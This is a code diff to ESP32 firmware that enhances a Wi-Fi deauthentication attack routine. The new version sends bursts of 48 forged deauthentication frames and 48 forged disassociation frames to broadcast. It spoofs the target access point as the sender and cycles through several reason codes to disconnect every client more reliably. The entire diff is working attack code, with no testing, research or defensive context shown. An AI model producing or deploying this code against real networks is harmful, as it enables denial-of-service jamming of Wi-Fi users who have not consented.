@@ -86,15 +86,21 @@ private:
     void _sendDeauthBurst() {
         esp_wifi_set_channel(_deauthChannel, WIFI_SECOND_CHAN_NONE);
         const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-        for (int i = 0; i < 8; i++) {
+        static const uint8_t reasons[] = {0x01,0x02,0x03,0x07,0x08,0x09,0x0E,0x05};
+        for (int i = 0; i < 48; i++) {
+            uint8_t r = reasons[i % 8];
+            // Deauth AP→broadcast
             uint8_t f[26] = {};
             f[0] = 0xC0; f[1] = 0x00;
-            f[22] = (uint8_t)((i & 0x0F) << 4);
-            f[24] = 0x03; // reason: deauth leaving BSS
-            memcpy(f +  4, bcast,          6); // DA: broadcast
-            memcpy(f + 10, _deauthTarget,  6); // SA: AP
-            memcpy(f + 16, _deauthTarget,  6); // BSSID
-            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
+            f[2] = 0x3A; f[3] = 0x01;
+            f[24] = r;
+            memcpy(f +  4, bcast,         6);
+            memcpy(f + 10, _deauthTarget, 6);
+            memcpy(f + 16, _deauthTarget, 6);
+            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
+            // Disassoc AP→broadcast
+            f[0] = 0xA0;
+            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
         }
     }
 };
